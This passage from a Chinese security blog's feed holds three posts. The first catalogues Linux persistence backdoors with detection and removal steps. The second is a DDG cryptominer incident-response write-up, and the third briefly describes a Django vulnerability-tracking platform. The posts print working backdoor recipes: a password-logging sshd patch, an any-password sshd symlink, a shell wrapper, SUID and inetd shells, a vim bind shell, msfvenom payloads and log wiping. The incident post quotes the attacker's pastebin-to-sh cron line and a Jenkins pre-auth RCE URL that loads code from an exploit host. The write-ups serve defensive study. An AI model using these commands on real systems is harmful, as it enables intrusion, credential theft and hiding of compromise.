https://kionf.com/2018/09/13/metasploit-presistence/ https://www.jianshu.com/p/0cfcbba813ac https://blog.csdn.net/gaojinshan/article/details/8480185 http://www.atomsec.org/%E9%80%86%E5%90%91/appinit_dlls%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5dll/ https://payloads.online/archivers/2018-10-14/1 https://github.com/wings27/blogs/blob/master/%E5%88%A9%E7%94%A8Windows%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E9%BB%98%E8%AE%A4%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9B%BF%E6%8D%A2.md https://www.anquanke.com/post/id/151425 https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/ https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/ https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/ https://github.com/Ridter/Intranet_Penetration_Tips/blob/master/README.MD https://www.4hou.com/system/5171.html https://www.secpulse.com/archives/52053.html https://www.secpulse.com/archives/39555.html http://drops.xmd5.com/static/drops/tips-10346.html http://drops.xmd5.com/static/drops/tips-8189.html http://drops.xmd5.com/static/drops/tips-8290.html http://drops.xmd5.com/static/drops/tips-8260.html https://github.com/3gstudent/Office-Persistence https://www.jianshu.com/p/4c1af7889e87 https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/ https://www.secpulse.com/archives/55476.html https://www.freebuf.com/articles/web/180581.html https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/]]></content>
      <tags>
        <tag>应急响应</tag>
        <tag>权限维持</tag>
        <tag>后门</tag>
        <tag>挖矿</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux、Windows权限维持常用后门学习总结：Linux篇]]></title>
    <url>%2F2019%2F03%2F09%2FLinux%E3%80%81Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言在上周做的变种DDG挖矿木马-watchdogs应急响应中，攻击者使用了预加载来劫持ps、top等系统命令，没有提及具体的排查手段，借着这篇文章来详细解释下，并总结下Linux、Windows下权限维持中被常用的后门技术，借此来学习下。 PS: 所有技术细节都来源于网上文章，如有错误，还望大佬不吝指正！ 0x01 Linux常见的bash、脚本语言、计划任务、公钥、msf以及rootkit等就不详细介绍了，有些像suid、inetd比较久远的，虽然不常用，但是学习下也没啥坏处。 1. 预加载型动态链接库后门linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。这就是为什么在watchdogs挖矿木马中使用top、ps等命令无法发现挖矿进程的原因，这种后门推荐使用静态编译的ls、ps等命令或者busybox进行查找。 利用LD_PRELOAD检测 12echo $LD_PRELOAD#默认无输出，如果有输出就需要去看下文件是否为异常文件了 清除 12unset LD_PRELOAD#使用命令unset LD_PRELOAD即可卸载使用LD_PRELOAD环境变量安装的恶意动态链接库 利用/etc/ld.so.preload检测 1234567891011121、文件完整性检测修改了默认的动态链接库后文件完整性发生变化，可以使用rpm等来校验首先获取系统中的动态链接器的文件路径(interp段指定了动态链接器的位置)readelf -a /bin/ps | grep interpreter然后判断该动态链接器文件的完整性busybox ls -al /usr/local/lib/libioset.sorpm -Vf /usr/local/lib/libioset.so2、使用stracestrace可以跟踪一个进程执行时所产生的系统调用，包括参数，返回值，执行消耗的时间和所接收的信号strace -f -e trace=file /bin/ps-f 表示同时跟踪fork和vfork出来的进程-e trace=file 表示只跟踪有关文件操作的系统调用 清除 1清除调用的对应恶意文件即可 2. strace后门上面提到使用strace检测预加载型动态链接库后门，它可以跟踪任何进程的系统调用和数据，所以strace同样可以作为后门，比如用来记录ssh，su，sudo的数据。 首先找到sshd的进程PID 1ps -ef | grep sshd #父进程PID 然后写入文件 1strace -f -p 2908 -o /tmp/.ssh.log -e trace=read,write -s 2048 同样的，可以通过配置用户目录下.login配置获取ssh明文密码 123#vim /etc/bashrcalias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'#su，sudo同样的道理 检测 1查看shell的配置文件或者alias命令即可发现，例如~/.bashrc或~/.zshrc文件查看是否有恶意的alias 3. SSH 后门OpenSSH后门通过在openssh源码中插入恶意代码并进行重新编译来替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。在openssh目录中找到includes.h文件。 12345678910111213#vim includes.hint secret_ok;FILE *f;#define ILOG "/tmp/.ilog" #记录登录到本机的用户名和密码#define OLOG "/tmp/.olog" #记录本机登录到远程的用户名和密码#define SECRETPW "secpulse.com" #为自己的登录密码#endif /* INCLUDES_H */#编译，重启服务yum install -y openssl openssl-devel pam-devel zlib zlib-devel./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5make cleanmake &amp;&amp; make installsystemctl restart sshd.service PS: 如果记录日志放在web下，记得清理掉访问日志。 12345export HISTFILE=/dev/nullexport HISTFILESIZE=0sed -i '/192.168.2.11/d' /etc/httpd/logs/access_log*sed -i '/192.168.2.11/d' /root/.bash_historyecho &gt; /root/.bash_history 检测 12345678910111213141、查看Openssh版本ssh -V2、查看ssh配置文件和/usr/sbin/sshd的时间stat /usr/sbin/sshd#时间和版本都是可以修改的，所以不靠谱3、查看日志more /var/log/secure | grep "Accepted" | awk '&#123;print $11&#125;' | uniq4、通过strace监控sshd进程读写文件的操作ps axu | grep sshd | grep -v grep #sshd父进程IDstrace -o sshd -ff -p 2908grep open sshd* | grep -v -e No -e null -e denied| grep WR5、一般的openssh后门都会将账户密码记录到文件或者发送到邮箱中strings /usr/sbin/sshd |grep '[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.'strings /usr/sbin/sshd |grep '@' 清除 12重装或者更新到最新版本修改文件并重新编译 sshd软链接后门在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名(如: /tmp/su，/home/su)在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。 1、服务端执行 123ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12345 2、客户端执行 12ssh root@x.x.x.x -p 12345#输入任意密码就可以root用户权限登陆了，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆，比如：ubuntu 检测 12341、查看可疑端口netstat -antlp2、查看可执行文件ls -al /tmp/su 清除 123451、禁止PAM认证vim /etc/ssh/sshd_configUsePAM no2、重载/etc/init.d/sshd reload wrapper后门首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。 12345678910111213141516171819#服务端执行:cd /usr/sbinmv sshd ../binecho '#!/usr/bin/perl' &gt; sshdecho 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..LF/);' &gt;&gt;sshdecho 'exec &#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,' &gt;&gt;sshdchmod u+x sshd/etc/init.d/sshd restart#客户端执行:socat STDIO TCP4:192.168.2.11:22,souceport=19526#其中x00x00LF是19526的大端形式，便于传输和处理。如果你想修改源端口，可以用python的struct标准库实现&gt;&gt;&gt; import struct&gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526)&gt;&gt;&gt; print repr(buffer)'\x00\x00LF'&gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377)&gt;&gt;&gt; print buffer4A 检测 12检查网络链接情况及文件cat /usr/sbin/sshd 清除 1rm -rf /usr/sbin/sshd; mv /usr/bin/sshd ../sbin; 4. SUID后门当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件： 12341、SUID权限仅对二进制程序有效。 2、执行者对于该程序需要具有x的可执行权限3、本权限仅在执行该程序的过程中有效 4、在执行过程中执行者将具有该程序拥有者的权限 可以利用webshell进行利用 1234567891011121314#vim suid.c#include&lt;stdlib.h&gt;main () &#123;setuid(0);system("/bin/bash");&#125;编译成二进制文件gcc suid.c -o suidshell赋予suid权限chmod 4755 suidshellchmod u+s suidshell假设webshell权限较低，希望使用suid shell执行root命令，通过web的方式调用http://localhost/suid.php?path=/tmp/suidshell&amp;cmd=id即可以root的权限执行命令id 检测 123查找具有suid权限的文件即可find / -perm +4000 -lsfind / -perm -u=s -type f 2&gt;/dev/null 清除 1清除文件即可 5. inetd服务后门inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，其实有很多比较古老的服务都是基于此守护进程的。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。 12345678910111213141516#修改/etc/inetd.conf#discard stream tcp nowait root internal #discard dgram udp wait root internal daytime stream tcp nowait root /bin/bash bash -i开启inetd：inetd#nc连接nc -vv 192.168.2.11 13#可以配合suid后门#比如，修改/etc/services文件：suidshell 6666/tcp#然后修改/etc/inetd.confsuidshell stream tcp nowait root /bin/bash bash -i#可以修改成一些常见的端口，以实现隐藏 检测 12查看配置文件即可/etc/inetd.conf 清理 12关闭服务删除配置文件 6. 协议后门在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。 ICMP主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: 小白必看！ICMP隐蔽隧道从入门到精通 开源工具： ICMP后门项目地址https://github.com/andreafabrizi/prism 1234567#服务端./sendPacket.py 192.168.0.1 p4ssw0rd 192.168.0.10 6666#客户端nc -l -p 6666#其他模式详情请查看具体使用语法 DNS在大多数的网络里环境中IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：【技术分享】通过DNS传输后门来绕过杀软 开源工具： DNS后门项目地址https://github.com/DamonMohammadbagher/NativePayload_DNS 12345678910#创建msfvenom payloadmsfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 –f c &gt; /root/dns/payload.txt#内容格式如下：1.1.1.0 "0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com"1.1.1.1 "0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com"1.1.1.2 "0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com"#在系统中伪造DNS服务器dnsspoof -i eth0 -f /root/dns/payload.txt#客户端运行代码syntax: NativePayload_DNS.exe "1.1.1." 34 "192.168.1.50" 协议后门检测 1对于DNS/ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接 清理 1kill进程、删除文件即可 7. vim后门适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。 1cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c "pyfile dir.py"&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py 具体详情请参考：Weapons of Text Destruction 恶意脚本dir.py的内容可以是任何功能的后门，比如： 12345678910111213#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.htmlfrom socket import *import subprocessimport os, threading, sys, timeif __name__ == "__main__": server=socket(AF_INET,SOCK_STREAM) server.bind(('0.0.0.0',11)) server.listen(5) print 'waiting for connect' talk, addr = server.accept() print 'connect from',addr proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk, stdout=talk, stderr=talk, shell=True) 检测 1234由于是通过vim执行的，所以使用ps和netstat仍可以看到vim的相关进程netstat -antlp | grep vimmore /proc/PID/cmdlinemore /proc/PID/maps | grep python 清除 12#清除进程即可netstat -antlp | awk '&#123;print $7&#125;' | grep vim | awk -F/ '&#123;print $1&#125;' | xargs kill -9 8. PAM后门PAM使用配置 /etc/pam.d/下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security下的模块。PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open 上面提到的sshd软链接后门利用的PAM机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。 利用步骤： 复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt; 将生成的pam_uninx.so文件覆盖到/lib/secruity/pam_unix.so下 &gt;&gt;&gt; 修改文件属性 &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志 &gt;&gt;&gt; ok 12345#确保ssh开启pam支持vim /etc/ssh/sshd_configUsePAM yes#自动化脚本https://github.com/litsand/shell/blob/master/pam.sh 检测 12345671、通过Strace跟踪sshps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR2、检查pam_unix.so的修改时间stat /lib/security/pam_unix.so #32位stat /lib64/security/pam_unix.so #64位 清除 1yum reinstall pam 9. 进程注入从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。ptrace系统调用允许一个进程去调试另外一个进程。 具体原理参考: linux进程注入 linux一种无文件后门技巧/) GitHub存在大量开源工具，比如: linux-inject，主要原理是使用ptrace向进程中注入恶意so文件 12#./inject [-n process-name] [-p pid] [library-to-inject]./inject -n sample-target sample-library.so 检测 1使用相关检测工具 清除 1kill或者重启对应的进程即可 10. Rootkitrootkit分为内核级和应用级两种。(这方面不太了解，后续详细学习下，就不做详细介绍了…) 内核级的rootkit很多，比如：Diamorphine 应用级的rootkit也很多，比如：Mafix Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件(利用/proc?) 检测 1使用相关检测工具，比如：unhide PS: 事件排查结束后，能重装就重装吧，别折腾清理什么后门了。说不定就被你没留意的一个小细节或者不知道的一个特性给坑了。 篇幅有点长，下一篇继续学习下Windows相关的。 参考文章https://www.secpulse.com/archives/69093.html https://www.freebuf.com/column/162604.html https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html http://hu3sky.ooo/2018/09/06/%E5%90%8E%E9%97%A8/ https://klionsec.github.io/ http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/ http://www.91ri.org/9026.html https://pythonpig.github.io/2018/06/26/suid%E5%90%8E%E9%97%A8(suid-shell)/ https://www.secpulse.com/archives/59674.html https://xz.aliyun.com/t/4090 https://zhuanlan.zhihu.com/p/41154036 https://www.anquanke.com/post/id/85431 https://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/ https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/]]></content>
      <tags>
        <tag>应急响应</tag>
        <tag>权限维持</tag>
        <tag>后门</tag>
        <tag>Linux</tag>
        <tag>挖矿</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Linux下变种DDG挖矿应急处理总结]]></title>
    <url>%2F2019%2F02%2F22%2F%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%98%E7%A7%8DDDG%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5%E5%A4%84%E7%90%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[背景春节刚过，黑产团队就开始了新的一年的工作。21日晚上九点多，正准备回家享受快乐时光呢，钉钉就响了，客户应急来了，8台机器感染挖矿木马病毒。根据今天看的默安科技发的文章说是”Linux DDG变种挖矿病毒”，挖矿病毒这两年也处理了不少了，但是这次的应急受益匪浅，值得记录一下。 0x00 事件处理过程0x01 传播途径此次事件从网上收集了下，途径不止有被通报的Redis， Jenkins RCE 漏洞 Nexus RCE 漏洞 Redis未授权访问or弱口令 然后被感染后受害者会尝试进行对外或内网SSH爆破、Redis探测并入侵 0x02 处理流程获取busybox为什么要获取busybox？这就是此次事件的特别之处，如果你使用top、ps等系统命令是看不到挖矿进程的，因为挖矿病毒修改了系统的动态链接库配置文件/etc/ld.so.preload内容并引用了/usr/local/lib/libioset.so，所以有些运维人员开始top、ps等未查找到异常进程是由于该病毒涉及到 Linux动态链接库预加载机制，是一种常用的进程隐藏方法，而系统的ls，ps等命令已被通过so库的preload机制被病毒劫持, ls会导致/etc/cron.d/root文件被刷写为病毒定时执行命令。 而busybox是静态编译的，不依赖于系统的动态链接库，从而不受ld.so.preload的劫持，能够正常操作文件。 123cd /bin/wget https://busybox.net/downloads/binaries/1.30.0-i686/busyboxchmod 755 busybox PS: 这里跟客户学到个命令，这条命令也是可以显示恶意进程的，有兴趣的可以查查。 1perf top -s pid,comm,dso,symbol 病毒文件12/tmp/ksoftirqds/tmp/watchdogs 关闭crontab12service crond stopsystemctl stop crond 修改hosts修改/etc/hosts来屏蔽病毒脚本下载，域名为解密sh文件之后出现的两个域名。 1busybox echo -e "\n0.0.0.0 pastebin.com\n0.0.0.0 thyrsi.com" &gt;&gt; /etc/hosts 删除，创建，并锁定 crontab相关文件使用chattr加i属性来防止文件被修改，查看具有哪些属性使用lsattr 123busybox rm /var/spool/cron/root &amp;&amp; busybox touch /var/spool/cron/root &amp;&amp; busybox chattr +i /var/spool/cron/rootbusybox rm /var/spool/cron/crontabs/root &amp;&amp; busybox touch /var/spool/cron/crontabs/root &amp;&amp; busybox chattr +i /var/spool/cron/crontabs/root busybox rm /etc/cron.d/root &amp;&amp; busybox touch /etc/cron.d/root &amp;&amp; busybox chattr +i /etc/cron.d/root 备份重要的crontab，然后删除cron.d目录的其他文件1busybox rm -f /etc/cron.d/* 检查并删除下面目录是否有异常文件1234busybox ls -al /etc/cron.dailybusybox ls -al /etc/cron.hourly busybox ls -al /etc/cron.monthly busybox ls -al /etc/cron.weekly 删除病毒相关执行文件和启动脚本1busybox find / -type f -name '*watchdogs*' | busybox xargs rm -f 删除病毒进程12345busybox pkill watchdogsbusybox pkill ksoftirqds也可以使用：busybox ps -ef | busybox grep -v grep | busybox egrep 'ksoftirqds' | busybox awk '&#123;print $1&#125;' | busybox xargs kill -9busybox ps -ef | busybox grep -v grep | busybox egrep 'watchdogs' | busybox awk '&#123;print $1&#125;' | busybox xargs kill -9 删除被preload的so库123busybox rm -f /usr/local/lib/libioset.sobusybox rm -f /etc/ld.so.preloadbusybox rm -f /etc/ld.so.cache 验证libioset.so被卸载12lsof |grep usr/local/lib/libioset.soecho $LD_PRELOAD 若结果为空， 则该动态链接库被卸载; 若有输出，kill掉占用的进程，重复执行该步骤; 若反复执行后无法成功卸载该动态链接库，请执行服务重启操作。 一键清理脚本默安科技也发了一个一键清理脚本，在此基础上，自己改了改。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# wget http://www.w2n1ck.com/clear.sh#!/bin/sh#LANG=zh_CN.UTF-8# 关闭crontabservice crond stopsystemctl stop crond# 写hosts, 屏蔽病毒脚本下载busybox echo -e "\n0.0.0.0 pastebin.com\n0.0.0.0 thyrsi.com" &gt;&gt; /etc/hosts# 删除，创建，并锁定 crontab相关文件busybox rm /var/spool/cron/root &amp;&amp; busybox touch /var/spool/cron/root &amp;&amp; busybox chattr +i /var/spool/cron/rootbusybox rm /var/spool/cron/crontabs/root &amp;&amp; busybox touch /var/spool/cron/crontabs/root &amp;&amp; busybox chattr +i /var/spool/cron/crontabs/root busybox rm /etc/cron.d/root &amp;&amp; busybox touch /etc/cron.d/root &amp;&amp; busybox chattr +i /etc/cron.d/root# 删除cron.d目录的其他文件busybox rm /etc/cron.d/*# 删除病毒相关执行文件和启动脚busybox find / -type f -name '*watchdogs*'|busybox xargs rm -f# 删除病毒进程busybox pkill watchdogsbusybox pkill ksoftirqds# 删除被preload的so库chattr -i /etc/ld.so.preloadchattr -i /usr/local/lib/libioset.sobusybox rm -f /usr/local/lib/libioset.sobusybox rm -f /etc/ld.so.preloadbusybox rm -f /etc/ld.so.cache# 验证libioset.so被卸载# lsof |grep /usr/local/lib/libioset.so# 无输出, 则该动态链接库被卸载, 直接执行验证步骤; 有输出, kill掉占用的进程, ,重复执行该步骤;# 再次清理异常进程busybox ps -ef | busybox grep -v grep | busybox egrep 'ksoftirqds' | busybox awk '&#123;print $1&#125;' | busybox xargs kill -9busybox ps -ef | busybox grep -v grep | busybox egrep 'watchdogs' | busybox awk '&#123;print $1&#125;' | busybox xargs kill -9# 清理异常文件busybox rm -f /tmp/watchdogsbusybox rm -f /etc/cron.d/tomcatbusybox rm -f /etc/cron.d/rootbusybox rm -f /var/spool/cron/rootbusybox rm -f /var/spool/cron/crontabs/rootbusybox rm -f /etc/rc.d/init.d/watchdogsbusybox rm -f /usr/sbin/watchdogs# 搜索可共享的动态链接库ldconfig# 清理开机启动项chkconfig watchdogs offchkconfig --del watchdogsservice crond startecho "Done, Please reboot!" 0x03 事件总结此次事件客户有9台服务器被感染，其中主要的一台是我们拿到信息之后发现只开放了，Nginx-80和Jenkins-8080，然后就被误导了。。。 首先使用了CVE-2019-1003000-jenkins-rce-poc，但是这个漏洞是需要具有Overall/Read”权限的用户才能完成。然后想起来前两天Orange发了个PreAuth的 12Part 1: https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.htmlPart 2: http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html POC： 12345678https://github.com/petercunha/Jenkins-PreAuth-RCE-PoCURL Payload:http://&lt;TARGET HOST&gt;/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='payload', root='http://&lt;EXPLOIT HOST&gt;')%0a@Grab(group='package', module='payload', version='1')%0aimport Payload; 但是我利用这个POC是可以打成功在shodan上的，但是没办法客户的无法成功，一度相当困惑。 后来看到异常文件： 然后想起来前两天RR大佬也爆了个Nexus的RCE，Nexus Repository Manager 3 RCE 分析 -【CVE-2019-7238】，然后试了下，成功了 剩下的几台就是Redis未授权访问导致的了，具体可以参考：未授权访问漏洞总结 彩蛋这次应急让我意外的是恶意的下载的sh脚本 1*/15 * * * * (curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh 访问之后base64解密看到之后相当惊喜： 1234567891011121314151617ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '&#123;print $2&#125;' | xargs kill -9ps auxf | grep -v grep | grep Circle_MI | awk '&#123;print $2&#125;' | xargs kill -9ps auxf | grep -v grep | grep get.bi-chi.com | awk '&#123;print $2&#125;' | xargs kill -9ps auxf | grep -v grep | grep hashvault.pro | awk '&#123;print $2&#125;' | xargs kill -9ps auxf | grep -v grep | grep nanopool.org | awk '&#123;print $2&#125;' | xargs kill -9ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '&#123;print $2&#125;' | xargs kill -9ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '&#123;print $2&#125;' | xargs kill -9ps auxf|grep -v grep|grep "xmr" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "xig" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "ddgs" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "qW3xT" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "wnTKYg" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "t00ls.ru" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "sustes" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "thisxxs" | awk '&#123;print $2&#125;' | xargs kill -9ps auxf|grep -v grep|grep "hashfish" | awk '&#123;print $2&#125;'|xargs kill -9ps auxf|grep -v grep|grep "kworkerds" | awk '&#123;print $2&#125;'|xargs kill -9 这是啥？这本来是攻击者为了让服务器资源都用在自己的挖矿进程上，关闭其他可能存在的挖矿及DDoS木马。 这TM真是良心啊！都不用整理了！以后遇到挖矿的事件拿出来一把梭！！！ 1234567891011121314151617chattr -i /etc/cron.d/rootchattr -i /etc/cron.d/systemchattr -i /etc/ld.so.preloadchattr -i /etc/cron.d/apachechattr -i /var/spool/cron/rootchattr -i /var/spool/cron/crontabs/rootchattr -i /usr/local/bin/dnschattr -i /usr/sbin/netdnschattr -i /bin/netstatrm -rf /etc/cron.d/system /etc/cron.d/apache /etc/cron.hourly/oanacron /etc/cron.daily/oanacron /etc/cron.monthly/oanacron /usr/local/lib/libntp.so /etc/init.d/netdns /etc/init.d/kworker /bin/httpdns /usr/local/bin/dns /bin/netstat /usr/sbin/netdnschkconfig --del kworkerchkconfig --del netdnsp=$(ps auxf|grep -v grep|grep ksoftirqds|wc -l)if [ $&#123;p&#125; -eq 0 ];then ps auxf|grep -v grep | awk '&#123;if($3&gt;=80.0) print $2&#125;'| xargs kill -9fi 使用chattr解锁相关文件，并删除；清除CPU占用率超过百分之80的进程 1234567if [ -e "/tmp/gates.lod" ]; then rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe) kill -9 $(cat /tmp/gates.lod) rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe) kill -9 $(cat /tmp/moni.lod) rm -rf /tmp/&#123;gates,moni&#125;.lodfi 清除billgates挖矿木马相关文件、进程。 12345echo 0&gt;/root/.ssh/authorized_keys #清除ssh密钥内容echo 0&gt;/var/spool/mail/root #清除邮件内容echo 0&gt;/var/log/wtmp #清除登录日志echo 0&gt;/var/log/secure #清除安全日志echo 0&gt;/var/log/cron #清除计划任务日志 总体来说此次挖矿的幕后操作者相当的良心，诚意满满！学到了！ 参考文章https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&amp;mid=2650236941&amp;idx=2&amp;sn=cd15e59cde2ed50ee8093def270acfe5&amp;chksm=f3e2d279c4955b6f935bf8129c2277d965f75bd1c5cdeece4e6dd81fc5d2a36292d52b86429c&amp;mpshare=1&amp;scene=23&amp;srcid=%23rd https://mp.weixin.qq.com/s/7HyO9gVdgDYL4x7DKCVgZA http://man.linuxde.net/ldconfig https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc http://vulsee.com/archives/vulsee_2019/0220_7345.html https://www.secpulse.com/archives/98372.html https://xz.aliyun.com/t/4136]]></content>
      <tags>
        <tag>linux</tag>
        <tag>应急响应</tag>
        <tag>Redis</tag>
        <tag>Jenkins</tag>
        <tag>Nexus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django开发漏洞管理平台]]></title>
    <url>%2F2018%2F12%2F12%2FDjango%E5%BC%80%E5%8F%91%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[前言在年初定的计划，今年学习python以及相关web框架，使用flask搞了两个系统，然后就打算好好学习下Django，然后就按照目前公司需求，开发个漏洞管理平台。 0x01 使用技术 语言：Python 2.7 web框架：Django 1.11 中文文档（随便找的）：http://djangobook.py3k.cn/2.0/ Django后台：xadmin 数据库：MySQL 前端框架：AdminLTE 官方示例文档：https://adminlte.io/themes/AdminLTE/index2.html 富文本编辑器：DjangoUeditor 0x02 需求分析主要分为如下几个模块： Dashboard展示： 将漏洞可视化，主要分为漏洞数量图表展示；漏洞等级分布图表展示；漏洞类型占比图表展示。 用户模块 用户个人中心；用户权限控制；及该用户下所属漏洞的增、删、改、查。 漏洞模块 主要包括漏洞的查看、添加、修改、删除，以及漏洞权限校验。 知识库 方便用户了解漏洞详情及漏洞修复。(主要是为了写漏洞报告文档的时候方便复制粘贴。。。) 0x03 实现 0x04 Todo还有很多没有实现，有些实现的还需要待完善。 漏洞分页 用户模块完善 知识库完善 漏洞导出报告 漏洞提醒 漏洞全局搜索 and so on …]]></content>
      <tags>
        <tag>BootStrap</tag>
        <tag>Python</tag>
        <tag>MySQL</tag>
        <tag>Django</tag>
